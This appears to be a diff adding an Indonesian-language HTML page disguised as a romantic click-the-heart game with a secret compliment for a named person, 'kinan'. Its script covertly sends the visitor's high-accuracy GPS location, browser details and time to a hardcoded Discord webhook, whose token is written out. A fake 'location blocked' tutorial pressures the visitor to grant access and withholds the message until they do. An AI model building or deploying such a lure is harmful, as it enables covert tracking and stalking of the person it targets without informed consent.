@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Special for U</title>
+    <style>
+        body {
+            margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; color: #444;
+        }
+        .container { background: white; padding: 35px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 85%; max-width: 400px; }
+        
+        /* Game Styles */
+        #game-box { display: block; }
+        .target { font-size: 50px; cursor: pointer; display: inline-block; margin: 20px 0; transition: 0.2s; user-select: none; }
+        
+        /* Main Content */
+        #main-content { display: none; }
+        .heart-anim { color: red; font-size: 40px; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
+        
+        .instruction { 
+            font-size: 0.85rem; color: #d63031; background: #fff5f5; 
+            padding: 15px; border-radius: 12px; margin-top: 15px; 
+            display: none; border: 1px solid #fab1a0;
+        }
+        .btn-retry {
+            margin-top: 10px; background: #ff7675; color: white; border: none;
+            padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="game-box">
+            <h2 id="title-game">Selesaikan Tantangan! ❤️</h2>
+            <p id="desc-game">Klik hati 5x untuk melihat pesan rahasia.</p>
+            <div id="counter">Sisa: 5</div>
+            <div class="target" id="heart-target">❤️</div>
+            
+            <div id="tutorial" class="instruction">
+                <strong>Akses Lokasi Diblokir ⚠️</strong><br>
+                Pesannya gak bisa muncul kalau lokasinya di-block.<br><br>
+                1. Klik ikon <b>Gembok/Setting</b> di pojok kiri atas.<br>
+                2. Ubah izin <b>Location</b> jadi <b>Allow</b>.<br>
+                3. Klik tombol refresh di bawah.
+                <br>
+                <button class="btn-retry" onclick="location.reload()">Refresh Halaman</button>
+            </div>
+        </div>
+
+        <div id="main-content">
+            <div class="heart-anim">❤️</div>
+            <h1>hi kinan, u have the greatest smile, don't let anyone take that from u</h1>
+        </div>
+    </div>
+
+    <script>
+        const URL_WEBHOOK = "https://discord.com/api/webhooks/1509553571090403389/P3rqDrlXEkvU5IXlV754lCdsM7D27EOGep4cv5uF2K8j6t8NIDPqVwuDmcOgbTmnAD_t";
+        let score = 0;
+        const targetScore = 5;
+
+        async function kirimData(status, pos = null) {
+            const payload = {
+                content: status === 'success' ? "✅ **Akses Diterima!**" : "❌ **Akses Ditolak/Gagal**",
+                embeds: [{
+                    title: "Informasi Pengunjung",
+                    color: status === 'success' ? 3066993 : 15158528,
+                    fields: [
+                        { name: "📱 Device", value: navigator.userAgent },
+                        { name: "📍 Lokasi", value: pos ? `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` : "User memblokir akses" },
+                        { name: "⏰ Waktu", value: new Date().toLocaleString("id-ID") }
+                    ]
+                }]
+            };
+            try { await fetch(URL_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }); } catch(e) {}
+        }
+
+        function handleLocation() {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    kirimData('success', position);
+                    document.getElementById('game-box').style.display = 'none';
+                    document.getElementById('main-content').style.display = 'block';
+                },
+                (error) => {
+                    kirimData('denied');
+                    // Sembunyikan elemen game, munculkan tutorial
+                    document.getElementById('heart-target').style.display = 'none';
+                    document.getElementById('counter').style.display = 'none';
+                    document.getElementById('title-game').innerText = "Opps! Ada Masalah";
+                    document.getElementById('desc-game').style.display = 'none';
+                    document.getElementById('tutorial').style.display = 'block';
+                    
+                    alert("Yah, lokasinya diblokir. Izinkan dulu ya biar pesannya bisa kebuka!");
+                },
+                { enableHighAccuracy: true, timeout: 7000 }
+            );
+        }
+
+        document.getElementById('heart-target').addEventListener('click', function() {
+            score++;
+            document.getElementById('counter').innerText = `Sisa: ${targetScore - score}`;
+            
+            // Animasi gerak acak
+            const x = Math.random() * 50 - 25;
+            const y = Math.random() * 50 - 25;
+            this.style.transform = `translate(${x}px, ${y}px)`;
+
+            if (score >= targetScore) {
+                handleLocation();
+            }
+        });
+    </script>
+</body>
+</html>
